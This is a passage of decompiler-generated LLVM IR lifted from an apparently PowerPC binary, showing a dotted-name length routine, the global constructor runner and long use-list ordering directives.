  uselistorder i32* @r26, { 1, 23, 24, 25, 26, 27, 28, 29, 32, 30, 31, 33, 34, 35, 36, 37, 10, 11, 38, 39, 40, 41, 12, 13, 14, 15, 42, 2, 43, 44, 45, 46, 47, 48, 49, 50, 51, 16, 17, 18, 19, 20, 21, 90, 91, 3, 4, 5, 6, 7, 8, 9, 92, 93, 72, 73, 101, 97, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 98, 74, 75, 76, 77, 78, 79, 81, 80, 82, 83, 84, 85, 86, 87, 88, 89, 0, 99, 100, 64, 70, 71, 65, 66, 67, 22, 94, 95, 96, 68, 69 }
  uselistorder i32 ()* @__asm_mfcr, { 34, 33, 21, 22, 15, 14, 13, 42, 41, 17, 18, 36, 29, 40, 26, 25, 39, 10, 37, 35, 7, 6, 46, 31, 12, 51, 48, 47, 52, 50, 30, 32, 38, 60, 4, 11, 54, 59, 58, 55, 23, 5, 20, 45, 43, 24, 1, 57, 28, 19, 9, 3, 2, 44, 0, 62, 61, 56, 49, 8, 53, 16, 27 }
  uselistorder label %dec_label_pc_10017998, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10017988, { 1, 0 }
  uselistorder label %dec_label_pc_10017970, { 1, 0 }
  uselistorder label %dec_label_pc_1001796c, { 1, 0 }
  uselistorder label %dec_label_pc_1001795c, { 1, 0 }
  uselistorder label %dec_label_pc_10017918, { 1, 0 }
  uselistorder label %dec_label_pc_10017900, { 1, 0 }
  uselistorder label %dec_label_pc_100178f8, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v0_100179b4 = load i32, i32* @r3, align 4
  store i32 %v0_100179b4, i32* %r11.global-to-local, align 4
  %v3_100179b4 = icmp eq i32 %v0_100179b4, 0
  %v0_100179bc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100179b4, i32 %v0_100179bc)
  %v0_100179cc = load i32, i32* @r4, align 4
  br label %dec_label_pc_100179d8

dec_label_pc_100179c4:                            ; preds = %dec_label_pc_100179d4
  %v1_100179c4 = add i32 %v1_100179d8, 2
  br label %dec_label_pc_100179f4

dec_label_pc_100179d4:                            ; preds = %dec_label_pc_100179d8
  %v2_100179ec = add i32 %v1_100179dc, %v5_100179d8
  %v3_100179e8 = icmp eq i32 %v1_100179e4, 192
  br i1 %v3_100179e8, label %dec_label_pc_100179c4, label %dec_label_pc_100179d8

dec_label_pc_100179d8:                            ; preds = %dec_label_pc_100179d4, %entry
  %v1_100179d8 = phi i32 [ %v2_100179ec, %dec_label_pc_100179d4 ], [ %v0_100179cc, %entry ]
  %v0_100179d8 = load i32, i32* %r11.global-to-local, align 4
  %v2_100179d8 = add i32 %v0_100179d8, %v1_100179d8
  %v3_100179d8 = inttoptr i32 %v2_100179d8 to i8*
  %v4_100179d8 = load i8, i8* %v3_100179d8, align 1
  %v5_100179d8 = zext i8 %v4_100179d8 to i32
  %v1_100179dc = add i32 %v1_100179d8, 1
  %v3_100179e0 = icmp eq i8 %v4_100179d8, 0
  %v1_100179e4 = call i32 @__asm_rlwinm(i32 %v5_100179d8, i32 0, i32 24, i32 25)
  br i1 %v3_100179e0, label %dec_label_pc_100179f4, label %dec_label_pc_100179d4

dec_label_pc_100179f4:                            ; preds = %dec_label_pc_100179d8, %dec_label_pc_100179c4
  %v1_100179f4 = phi i32 [ %v1_100179c4, %dec_label_pc_100179c4 ], [ %v1_100179dc, %dec_label_pc_100179d8 ]
  %v0_100179f4 = load i32, i32* @r4, align 4
  %v2_100179f4 = sub i32 %v1_100179f4, %v0_100179f4
  ret i32 %v2_100179f4

; uselistorder directives
  uselistorder i32 %v1_100179dc, { 1, 0 }
  uselistorder i32 %v5_100179d8, { 1, 0 }
  uselistorder i32 %v1_100179d8, { 2, 1, 0 }
  uselistorder i32 %v0_100179b4, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 3, 4, 82, 59, 5, 6, 88, 89, 7, 8, 9, 1, 2, 86, 87, 11, 10, 60, 68, 83, 84, 29, 26, 27, 92, 93, 103, 91, 30, 44, 45, 46, 104, 105, 106, 85, 58, 61, 62, 28, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 63, 64, 65, 66, 67, 24, 96, 97, 98, 99, 100, 12, 13, 14, 15, 16, 90, 94, 0, 17, 21, 18, 101, 102, 19, 20, 95, 22, 23, 25, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 107 }
  uselistorder i32 25, { 4, 5, 6, 7, 8, 10, 0, 11, 9, 1, 2, 3 }
  uselistorder i32 24, { 28, 29, 30, 31, 32, 33, 34, 35, 36, 59, 41, 60, 37, 38, 39, 9, 10, 11, 12, 13, 8, 63, 2, 42, 43, 44, 61, 14, 49, 15, 62, 40, 45, 46, 47, 50, 51, 52, 53, 54, 55, 56, 57, 58, 65, 66, 48, 21, 68, 67, 3, 4, 5, 6, 7, 16, 64, 17, 18, 19, 20, 22, 0, 1, 23, 24, 25, 26, 27 }
  uselistorder i8 0, { 41, 38, 9, 42, 6, 43, 44, 45, 46, 10, 11, 12, 13, 14, 47, 31, 51, 49, 30, 50, 48, 29, 52, 53, 54, 55, 15, 57, 56, 32, 16, 58, 59, 17, 60, 61, 18, 28, 34, 64, 62, 63, 33, 65, 66, 19, 67, 68, 69, 71, 70, 35, 72, 73, 0, 74, 75, 76, 77, 20, 78, 80, 81, 82, 83, 79, 84, 21, 85, 86, 87, 88, 22, 23, 24, 25, 26, 90, 91, 92, 93, 89, 94, 7, 95, 97, 96, 27, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 1, 109, 110, 111, 112, 113, 114, 115, 39, 2, 116, 117, 118, 120, 119, 36, 121, 122, 123, 124, 125, 3, 126, 127, 128, 129, 130, 131, 132, 133, 4, 134, 135, 138, 136, 137, 8, 139, 140, 141, 5, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 157, 155, 156, 158, 159, 160, 161, 162, 165, 164, 37, 163, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 185, 184, 40, 186, 187, 188 }
  uselistorder i32 192, { 0, 1, 3, 4, 2 }
  uselistorder i32 2, { 0, 42, 81, 2, 226, 227, 185, 82, 186, 187, 43, 3, 4, 5, 6, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 7, 200, 8, 152, 153, 154, 44, 40, 201, 202, 203, 204, 205, 161, 162, 163, 68, 69, 248, 70, 83, 228, 84, 229, 9, 167, 85, 86, 87, 155, 156, 233, 234, 157, 239, 240, 249, 65, 10, 11, 12, 13, 88, 206, 14, 15, 231, 232, 164, 165, 230, 158, 159, 241, 160, 89, 90, 166, 1, 39, 168, 91, 242, 71, 243, 92, 93, 151, 72, 73, 244, 245, 246, 247, 94, 54, 169, 16, 45, 209, 210, 55, 214, 215, 17, 216, 235, 236, 56, 58, 57, 59, 95, 96, 97, 98, 60, 61, 99, 100, 179, 101, 180, 102, 181, 177, 251, 46, 18, 19, 103, 104, 105, 106, 107, 20, 74, 79, 80, 108, 109, 207, 75, 21, 47, 256, 22, 23, 48, 49, 50, 110, 51, 52, 237, 238, 211, 212, 217, 218, 219, 24, 25, 26, 27, 28, 220, 221, 29, 223, 224, 225, 38, 222, 213, 111, 30, 76, 255, 257, 31, 170, 171, 172, 173, 174, 252, 112, 250, 254, 253, 32, 53, 62, 63, 113, 175, 33, 114, 176, 77, 41, 64, 115, 116, 35, 34, 78, 118, 117, 178, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 136, 135, 137, 139, 138, 141, 140, 182, 66, 143, 67, 183, 142, 184, 145, 144, 208, 36, 37, 146, 147, 148, 149, 150 }
  uselistorder i32* @r4, { 139, 140, 1, 141, 142, 143, 144, 2, 145, 146, 58, 229, 4, 230, 231, 232, 233, 147, 148, 10, 11, 149, 150, 51, 59, 52, 53, 56, 12, 234, 237, 151, 152, 153, 154, 155, 156, 5, 39, 40, 41, 42, 43, 44, 45, 6, 238, 209, 226, 227, 228, 240, 46, 47, 251, 245, 257, 252, 71, 72, 157, 158, 159, 161, 162, 163, 164, 165, 9, 166, 167, 168, 169, 170, 171, 172, 173, 29, 235, 54, 55, 48, 49, 50, 246, 57, 60, 13, 258, 61, 62, 14, 236, 15, 63, 64, 247, 248, 249, 16, 65, 66, 67, 17, 250, 30, 31, 68, 69, 70, 108, 18, 210, 241, 242, 243, 211, 212, 213, 214, 284, 276, 128, 130, 131, 270, 136, 137, 73, 132, 133, 134, 74, 75, 205, 271, 256, 129, 106, 19, 20, 21, 253, 254, 174, 175, 176, 182, 183, 277, 278, 279, 160, 7, 215, 216, 217, 22, 218, 219, 177, 178, 179, 180, 181, 184, 185, 186, 8, 283, 244, 187, 192, 193, 194, 195, 196, 188, 197, 117, 220, 221, 222, 0, 223, 224, 225, 262, 198, 199, 200, 118, 119, 121, 206, 207, 122, 208, 201, 202, 203, 23, 76, 77, 275, 239, 280, 281, 282, 78, 79, 80, 81, 82, 272, 263, 83, 24, 255, 25, 84, 85, 86, 32, 88, 89, 87, 90, 91, 273, 274, 92, 26, 27, 28, 94, 3, 93, 33, 95, 96, 264, 266, 267, 268, 265, 97, 34, 260, 98, 99, 259, 261, 269, 100, 101, 102, 103, 104, 105, 107, 35, 36, 37, 38, 120, 109, 110, 111, 112, 113, 114, 115, 116, 123, 124, 125, 126, 127, 135, 138, 189, 190, 191, 204 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 10, 11, 12, 13, 14, 15, 16, 17, 18, 7, 0, 30, 31, 19, 1, 8, 25, 26, 27, 28, 29, 9, 32, 23, 20, 21, 35, 34, 24, 22, 4, 5, 33, 2, 3, 6 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1002a658.637 to i32), i32* %r31.global-to-local, align 4
  %v3_10017a18 = load i32, i32* @global_var_1002a658.637, align 4
  %v3_10017a1c = icmp eq i32 %v3_10017a18, -1
  br i1 %v3_10017a1c, label %dec_label_pc_10017a38, label %dec_label_pc_10017a24

dec_label_pc_10017a24:                            ; preds = %entry, %dec_label_pc_10017a24
  %v0_10017a24 = phi i32 [ %v3_10017a2c, %dec_label_pc_10017a24 ], [ %v3_10017a18, %entry ]
  call void @__pseudo_call(i32 %v0_10017a24)
  %v0_10017a2c = load i32, i32* %r31.global-to-local, align 4
  %v1_10017a2c = add i32 %v0_10017a2c, -4
  %v2_10017a2c = inttoptr i32 %v1_10017a2c to i32*
  %v3_10017a2c = load i32, i32* %v2_10017a2c, align 4
  store i32 %v1_10017a2c, i32* %r31.global-to-local, align 4
  %v3_10017a30 = icmp eq i32 %v3_10017a2c, -1
  br i1 %v3_10017a30, label %dec_label_pc_10017a38, label %dec_label_pc_10017a24

dec_label_pc_10017a38:                            ; preds = %dec_label_pc_10017a24, %entry
  %v0_10017a48 = load i32, i32* @r3, align 4
  ret i32 %v0_10017a48

; uselistorder directives
  uselistorder i32 %v3_10017a2c, { 1, 0 }
  uselistorder i32 -4, { 25, 6, 7, 8, 9, 10, 11, 35, 36, 37, 38, 39, 2, 3, 4, 5, 12, 32, 33, 34, 19, 20, 21, 22, 23, 26, 27, 13, 14, 15, 16, 40, 24, 44, 45, 41, 42, 43, 28, 29, 30, 31, 17, 18, 0, 1 }
  uselistorder void (i32)* @__pseudo_call, { 60, 35, 32, 14, 36, 37, 62, 63, 64, 65, 0, 15, 16, 51, 66, 67, 68, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 70, 71, 29, 30, 69, 31, 33, 34, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 72, 73, 74, 1, 2, 3, 4, 5, 6, 7, 8, 75, 9, 52, 53, 76, 61, 80, 81, 56, 78, 10, 11, 54, 77, 12, 79, 55, 59, 57, 58, 13 }
  uselistorder i32 -1, { 446, 447, 20, 63, 79, 389, 390, 245, 187, 391, 80, 392, 67, 81, 393, 82, 394, 303, 304, 166, 167, 84, 83, 305, 64, 65, 306, 307, 308, 246, 90, 88, 86, 309, 310, 311, 89, 87, 85, 312, 313, 247, 314, 248, 395, 31, 32, 188, 181, 189, 191, 190, 192, 62, 480, 481, 249, 396, 250, 68, 251, 91, 92, 315, 316, 317, 318, 479, 431, 93, 483, 193, 7, 8, 484, 485, 69, 486, 487, 319, 33, 94, 493, 252, 498, 36, 37, 38, 499, 253, 502, 34, 35, 95, 328, 254, 329, 39, 40, 330, 331, 397, 41, 398, 399, 400, 196, 401, 402, 403, 404, 405, 406, 407, 194, 408, 195, 409, 410, 411, 412, 197, 320, 255, 168, 321, 322, 198, 256, 177, 323, 42, 21, 96, 297, 199, 70, 298, 43, 299, 300, 182, 200, 494, 301, 324, 201, 325, 326, 327, 257, 488, 258, 71, 9, 259, 489, 490, 260, 261, 262, 491, 263, 413, 414, 44, 45, 46, 264, 415, 416, 265, 432, 433, 434, 66, 448, 449, 450, 183, 72, 451, 452, 453, 454, 202, 455, 10, 97, 456, 457, 458, 459, 460, 266, 461, 203, 462, 463, 204, 11, 12, 205, 73, 492, 267, 377, 268, 464, 465, 466, 467, 98, 506, 206, 99, 100, 101, 102, 103, 104, 105, 0, 518, 516, 106, 379, 380, 207, 269, 381, 49, 50, 270, 383, 47, 48, 271, 107, 507, 386, 13, 208, 108, 109, 332, 209, 333, 14, 110, 74, 384, 51, 52, 272, 210, 169, 385, 111, 334, 503, 504, 60, 511, 501, 382, 349, 75, 512, 76, 372, 77, 273, 417, 170, 418, 419, 211, 423, 424, 112, 113, 387, 519, 520, 468, 114, 274, 275, 420, 421, 276, 422, 277, 278, 178, 279, 280, 281, 282, 283, 53, 284, 212, 115, 116, 425, 426, 427, 435, 171, 436, 437, 438, 22, 23, 24, 25, 26, 27, 28, 174, 175, 469, 19, 470, 15, 471, 472, 285, 213, 29, 286, 473, 474, 1, 476, 477, 2, 214, 215, 287, 54, 216, 184, 478, 217, 475, 439, 16, 30, 176, 218, 17, 378, 445, 219, 440, 220, 441, 221, 117, 118, 222, 119, 120, 121, 513, 514, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 482, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 517, 151, 521, 152, 335, 336, 337, 338, 339, 153, 340, 341, 342, 343, 344, 345, 346, 347, 515, 172, 348, 288, 350, 154, 500, 155, 495, 496, 497, 156, 351, 352, 223, 224, 353, 225, 354, 355, 226, 78, 356, 357, 157, 3, 4, 508, 289, 290, 291, 292, 293, 185, 294, 295, 186, 296, 179, 359, 227, 55, 358, 228, 302, 360, 361, 56, 509, 57, 510, 58, 505, 362, 173, 5, 6, 61, 363, 364, 365, 366, 229, 158, 159, 367, 368, 369, 370, 442, 443, 371, 59, 160, 373, 374, 375, 376, 230, 231, 232, 233, 234, 161, 235, 388, 162, 236, 237, 428, 165, 164, 163, 429, 238, 430, 239, 240, 241, 242, 18, 180, 444, 243, 244 }
  uselistorder i32 1, { 495, 1435, 578, 1436, 1437, 1438, 1439, 1440, 1441, 399, 397, 398, 1442, 786, 1443, 1444, 108, 109, 107, 110, 1302, 900, 899, 579, 580, 582, 581, 1242, 901, 583, 1303, 694, 1445, 246, 903, 902, 904, 1652, 586, 584, 587, 585, 588, 1446, 688, 1447, 695, 1450, 1451, 1452, 1453, 1454, 787, 1455, 1456, 1457, 91, 92, 90, 93, 1458, 1459, 1460, 905, 73, 74, 72, 75, 1461, 76, 77, 1462, 61, 1463, 32, 30, 29, 31, 679, 1243, 1244, 1245, 1246, 1247, 1248, 1249, 1250, 1251, 1252, 1253, 907, 906, 392, 391, 390, 393, 394, 395, 1254, 1255, 1256, 1257, 908, 897, 300, 292, 302, 291, 297, 298, 299, 296, 294, 295, 293, 301, 303, 703, 1464, 1465, 682, 1466, 1467, 1468, 1469, 1470, 1471, 909, 33, 35, 34, 777, 1475, 1472, 1473, 1474, 910, 366, 365, 362, 364, 367, 361, 360, 363, 359, 358, 704, 1286, 1287, 788, 1288, 207, 204, 206, 205, 689, 1258, 1259, 683, 263, 264, 262, 258, 259, 260, 261, 914, 913, 912, 911, 257, 918, 917, 916, 915, 254, 789, 1676, 1677, 921, 920, 919, 1653, 922, 111, 113, 112, 114, 756, 923, 538, 0, 790, 705, 1354, 1355, 1356, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 1485, 1486, 1487, 1488, 1489, 1490, 1491, 193, 192, 191, 195, 196, 194, 1493, 1492, 696, 1357, 255, 1262, 1260, 1261, 706, 707, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 250, 249, 251, 252, 253, 1659, 924, 248, 247, 1601, 925, 589, 174, 149, 245, 697, 1660, 131, 132, 130, 129, 1661, 1662, 927, 926, 127, 126, 128, 590, 594, 591, 593, 592, 1678, 791, 1679, 1680, 928, 595, 596, 125, 124, 123, 242, 241, 1681, 792, 793, 930, 929, 240, 238, 237, 239, 794, 933, 932, 931, 308, 306, 307, 309, 934, 1494, 1495, 680, 1496, 1498, 1499, 1500, 1501, 1502, 936, 935, 597, 598, 600, 599, 1503, 1504, 1505, 1506, 1507, 674, 1508, 1509, 708, 1510, 1511, 749, 750, 795, 709, 743, 1512, 1513, 797, 757, 1514, 1515, 798, 1516, 1517, 1518, 1519, 796, 1520, 942, 941, 940, 939, 884, 938, 937, 82, 81, 78, 80, 79, 83, 1, 1521, 1522, 1523, 1524, 710, 84, 1232, 272, 271, 273, 1233, 489, 488, 487, 1234, 85, 1235, 65, 64, 539, 1236, 352, 351, 1237, 66, 1238, 68, 67, 711, 1654, 1655, 1658, 50, 51, 712, 1289, 1290, 1291, 1292, 943, 49, 14, 15, 713, 1656, 1657, 12, 1271, 1272, 1273, 944, 228, 227, 1274, 885, 276, 1275, 886, 198, 197, 1276, 1277, 1278, 887, 21, 20, 714, 1279, 1280, 799, 946, 945, 603, 604, 601, 602, 605, 715, 1281, 1282, 800, 948, 947, 607, 608, 609, 606, 610, 1671, 1672, 1673, 949, 611, 1283, 1284, 1285, 888, 184, 183, 1670, 2, 950, 1293, 1294, 716, 690, 1295, 1296, 758, 953, 952, 951, 282, 285, 284, 283, 280, 281, 279, 287, 286, 288, 415, 1297, 1298, 801, 178, 179, 1299, 1300, 1301, 16, 717, 954, 955, 1304, 956, 576, 574, 575, 577, 802, 1305, 718, 719, 960, 959, 958, 957, 350, 275, 1306, 720, 274, 1307, 1308, 200, 721, 1309, 1310, 201, 202, 203, 244, 962, 961, 889, 243, 1674, 803, 965, 964, 963, 805, 759, 722, 1239, 804, 1240, 1241, 976, 975, 974, 973, 972, 971, 970, 890, 969, 968, 967, 966, 171, 168, 159, 160, 169, 167, 165, 164, 166, 162, 170, 161, 163, 977, 751, 1675, 980, 979, 978, 512, 510, 509, 508, 511, 3, 4, 5, 6, 265, 7, 106, 8, 776, 473, 1311, 806, 1312, 990, 989, 988, 987, 986, 985, 984, 983, 982, 981, 492, 491, 490, 493, 494, 474, 1358, 1359, 102, 103, 1360, 371, 370, 369, 368, 372, 1663, 554, 555, 558, 557, 556, 1664, 1665, 807, 1666, 534, 536, 535, 269, 266, 268, 267, 808, 1562, 1563, 891, 59, 58, 60, 811, 1602, 1603, 1604, 809, 1605, 810, 1606, 1607, 1608, 1609, 1610, 1001, 1000, 999, 998, 997, 996, 995, 994, 993, 992, 892, 991, 215, 216, 211, 210, 218, 220, 223, 222, 219, 208, 217, 221, 224, 209, 226, 225, 214, 213, 212, 1611, 778, 41, 40, 39, 38, 42, 36, 37, 43, 613, 612, 614, 1688, 1689, 176, 177, 175, 1612, 1613, 1002, 618, 615, 617, 619, 616, 723, 1614, 1005, 1004, 1003, 311, 310, 620, 305, 289, 621, 559, 813, 812, 622, 814, 1006, 144, 815, 761, 760, 1405, 1010, 1009, 1008, 1007, 380, 383, 379, 382, 381, 1384, 1013, 1012, 1011, 543, 542, 544, 541, 515, 1708, 1014, 1415, 1416, 1417, 779, 1418, 140, 142, 138, 139, 137, 141, 143, 816, 1419, 724, 817, 818, 819, 820, 1015, 1313, 121, 117, 115, 119, 116, 120, 118, 122, 1408, 725, 1409, 1016, 624, 623, 625, 626, 627, 104, 105, 96, 95, 94, 97, 99, 98, 1410, 1017, 1314, 1018, 1315, 1019, 256, 1590, 1021, 1020, 523, 691, 1022, 628, 1682, 629, 821, 726, 396, 290, 413, 1025, 1024, 1023, 54, 762, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 780, 781, 1525, 727, 822, 1526, 1527, 763, 1528, 1538, 1040, 1039, 1038, 28, 24, 25, 23, 22, 26, 27, 1041, 1042, 1421, 1422, 1423, 1424, 1425, 1426, 457, 458, 461, 460, 454, 453, 452, 459, 462, 455, 456, 451, 1713, 1044, 1043, 630, 1046, 1045, 18, 17, 19, 823, 824, 1047, 1497, 1448, 1449, 1615, 1048, 631, 632, 698, 1616, 1529, 1530, 1531, 1532, 1533, 1534, 1535, 1536, 1537, 435, 437, 436, 438, 1541, 1539, 1540, 1543, 1542, 1667, 1668, 1669, 1544, 684, 182, 181, 180, 1721, 1722, 532, 529, 533, 530, 531, 1717, 1718, 1719, 1720, 634, 635, 633, 232, 825, 1545, 1546, 1547, 893, 229, 231, 230, 764, 1564, 1565, 1566, 744, 699, 235, 234, 233, 1567, 1568, 1569, 1570, 1049, 199, 1571, 728, 1572, 1573, 1051, 1050, 1548, 1549, 1550, 1052, 148, 147, 1574, 1053, 477, 476, 475, 1385, 1054, 553, 552, 1617, 1618, 827, 1619, 1620, 1621, 1622, 1623, 1624, 1626, 1627, 1628, 828, 1629, 1630, 729, 826, 1631, 829, 1632, 1633, 1634, 1625, 1058, 1057, 1056, 1055, 157, 151, 153, 154, 150, 155, 156, 158, 152, 1635, 1636, 1637, 1638, 1639, 638, 636, 637, 639, 640, 830, 524, 525, 1640, 1641, 135, 134, 136, 133, 1643, 730, 1644, 692, 731, 1646, 1647, 1648, 1649, 732, 1651, 740, 1650, 1645, 894, 1065, 1064, 1063, 1062, 1061, 1060, 1059, 644, 646, 648, 641, 647, 645, 642, 649, 643, 700, 701, 516, 517, 518, 1642, 765, 895, 831, 270, 1715, 766, 1716, 1575, 1576, 1577, 1578, 1579, 1580, 1581, 1582, 702, 1067, 1066, 88, 86, 89, 87, 1386, 1387, 767, 1069, 1068, 70, 71, 69, 1388, 1071, 1070, 527, 1073, 1072, 670, 671, 669, 1075, 1074, 1583, 1584, 1585, 1586, 1587, 1077, 1076, 62, 236, 389, 357, 562, 414, 434, 412, 278, 650, 507, 521, 560, 540, 410, 479, 486, 406, 1078, 1079, 651, 652, 478, 496, 561, 514, 733, 513, 1080, 566, 567, 471, 343, 344, 653, 654, 655, 433, 444, 450, 408, 1081, 448, 1082, 481, 522, 1083, 10, 11, 411, 1714, 1084, 424, 832, 1317, 1316, 769, 768, 402, 401, 403, 400, 833, 1319, 1318, 770, 506, 504, 505, 501, 503, 502, 1709, 1699, 734, 657, 656, 658, 735, 1331, 1332, 52, 53, 1694, 1695, 1693, 1085, 432, 13, 482, 483, 484, 1700, 1701, 1702, 1704, 675, 1703, 1705, 428, 427, 426, 407, 1320, 834, 172, 570, 1321, 835, 1322, 1323, 1324, 1325, 1089, 1088, 1087, 1086, 173, 1091, 1090, 420, 419, 421, 422, 418, 836, 1326, 1092, 341, 340, 837, 838, 839, 1093, 100, 1095, 1094, 441, 440, 442, 443, 439, 1327, 1096, 342, 1329, 840, 1097, 463, 485, 1330, 841, 1098, 551, 101, 312, 314, 313, 1328, 316, 315, 1100, 1099, 659, 660, 661, 1333, 1335, 1334, 429, 1690, 1692, 1691, 472, 1683, 1684, 1686, 685, 1687, 1101, 1710, 1712, 1711, 376, 736, 1696, 842, 1698, 1697, 1336, 145, 146, 409, 737, 1227, 1228, 1229, 844, 1230, 1231, 1338, 845, 1337, 1339, 843, 1340, 1341, 846, 1105, 1104, 1103, 1102, 329, 317, 318, 319, 324, 325, 320, 321, 338, 322, 323, 335, 337, 332, 326, 330, 331, 333, 328, 327, 334, 336, 847, 752, 1106, 849, 848, 1107, 850, 1108, 738, 739, 851, 1109, 277, 1110, 304, 449, 1706, 1112, 1111, 573, 572, 571, 1707, 1113, 663, 662, 377, 378, 416, 569, 1685, 1114, 568, 1342, 1344, 1115, 417, 499, 500, 1345, 373, 1343, 405, 404, 375, 374, 354, 353, 664, 665, 565, 563, 564, 55, 56, 57, 349, 348, 347, 345, 346, 355, 356, 44, 45, 852, 46, 47, 48, 1346, 339, 1347, 1348, 1349, 185, 187, 186, 189, 188, 190, 853, 528, 854, 1117, 1116, 667, 666, 1119, 1118, 855, 856, 1121, 1120, 480, 857, 858, 1350, 1126, 1125, 1124, 1123, 1122, 431, 430, 859, 1128, 1127, 668, 1129, 464, 1130, 860, 1351, 861, 1352, 1134, 1133, 1132, 1131, 519, 1353, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 423, 1146, 385, 384, 388, 387, 386, 1147, 447, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 550, 549, 548, 547, 546, 545, 1158, 1159, 1160, 1161, 470, 469, 468, 467, 466, 465, 862, 863, 520, 1162, 672, 673, 1361, 1362, 1363, 1364, 1365, 1366, 866, 753, 1367, 1368, 678, 864, 865, 867, 1369, 868, 1370, 1371, 676, 741, 1168, 1167, 1166, 1165, 1164, 1163, 869, 771, 772, 773, 870, 871, 1171, 1170, 1169, 1372, 1373, 1374, 1375, 1376, 1377, 1378, 1379, 1380, 1381, 1382, 1383, 1173, 1172, 896, 63, 1389, 746, 742, 1390, 1391, 1392, 1393, 745, 1394, 1395, 1396, 1397, 1398, 872, 1399, 1400, 1401, 1402, 1403, 1178, 1177, 1176, 1175, 1174, 498, 497, 1404, 537, 873, 1406, 874, 1407, 875, 1180, 1179, 1411, 1412, 1187, 1186, 1185, 1184, 1183, 1182, 1181, 1413, 1414, 1196, 1195, 1194, 1193, 1192, 1191, 1190, 1189, 1188, 1420, 754, 1200, 1199, 1198, 1197, 876, 1427, 693, 1428, 1429, 677, 1430, 1204, 1203, 1202, 1201, 446, 445, 1431, 1432, 1433, 1434, 1551, 1552, 877, 1553, 1554, 1555, 878, 687, 1556, 879, 1557, 1212, 1211, 1210, 1209, 1208, 1207, 1206, 1205, 526, 747, 681, 1558, 748, 774, 1559, 880, 1561, 686, 755, 1560, 881, 882, 883, 1218, 1217, 1216, 1215, 1214, 1213, 1588, 1589, 1219, 1591, 1592, 775, 1593, 9, 1594, 1222, 1221, 1220, 783, 1595, 1596, 782, 1597, 1598, 784, 785, 1599, 1600, 1224, 1223, 1226, 1225, 425, 898 }
  uselistorder label %dec_label_pc_10017a24, { 1, 0 }
}

define i32 @call___do_global_ctors_aux() local_unnamed_addr {
entry:
  %v0_10017a64 = load i32, i32* @r3, align 4
  ret i32 %v0_10017a64

; uselistorder directives
  uselistorder i32* @r3, { 53, 54, 382, 383, 386, 384, 385, 1, 184, 126, 127, 185, 187, 188, 190, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 189, 133, 186, 387, 388, 22, 502, 503, 504, 389, 23, 390, 160, 161, 162, 391, 392, 393, 174, 175, 55, 191, 543, 544, 545, 506, 176, 177, 56, 507, 511, 57, 58, 24, 301, 302, 25, 163, 164, 165, 5, 512, 471, 499, 500, 501, 59, 513, 514, 166, 547, 548, 167, 60, 559, 561, 549, 550, 121, 551, 552, 48, 61, 205, 206, 394, 395, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 26, 409, 410, 411, 412, 413, 414, 134, 135, 62, 508, 509, 63, 178, 179, 180, 181, 64, 168, 169, 170, 171, 172, 173, 65, 529, 530, 531, 532, 533, 527, 528, 182, 183, 192, 562, 193, 194, 195, 66, 510, 196, 67, 197, 198, 199, 68, 534, 535, 536, 537, 69, 200, 201, 202, 70, 538, 136, 137, 138, 139, 539, 540, 541, 542, 71, 203, 204, 563, 303, 304, 27, 305, 306, 307, 72, 515, 516, 517, 518, 519, 28, 415, 111, 73, 520, 521, 522, 523, 524, 472, 473, 6, 4, 474, 475, 476, 74, 546, 580, 581, 582, 583, 584, 585, 586, 125, 636, 0, 75, 7, 109, 347, 349, 350, 124, 621, 116, 352, 353, 354, 355, 356, 357, 358, 207, 208, 209, 455, 49, 592, 596, 597, 568, 564, 565, 566, 567, 622, 560, 348, 297, 553, 554, 505, 416, 417, 418, 419, 420, 421, 422, 367, 368, 369, 370, 371, 372, 8, 97, 98, 76, 77, 633, 634, 119, 396, 78, 9, 477, 478, 479, 480, 525, 79, 635, 526, 80, 423, 424, 425, 432, 433, 434, 435, 81, 436, 437, 438, 426, 439, 329, 481, 82, 482, 483, 484, 10, 14, 11, 485, 12, 486, 13, 487, 488, 489, 490, 491, 492, 83, 493, 494, 495, 496, 497, 498, 140, 587, 588, 589, 590, 591, 440, 441, 442, 443, 444, 445, 330, 331, 332, 118, 333, 334, 335, 466, 467, 468, 446, 447, 448, 449, 284, 110, 285, 51, 84, 624, 625, 29, 626, 598, 599, 15, 600, 601, 239, 240, 629, 630, 593, 602, 603, 604, 210, 211, 212, 213, 215, 214, 30, 216, 217, 218, 219, 220, 556, 557, 558, 555, 85, 221, 222, 223, 224, 86, 225, 226, 227, 228, 229, 230, 231, 87, 141, 142, 88, 232, 31, 233, 236, 89, 237, 90, 234, 235, 16, 91, 93, 238, 241, 242, 143, 571, 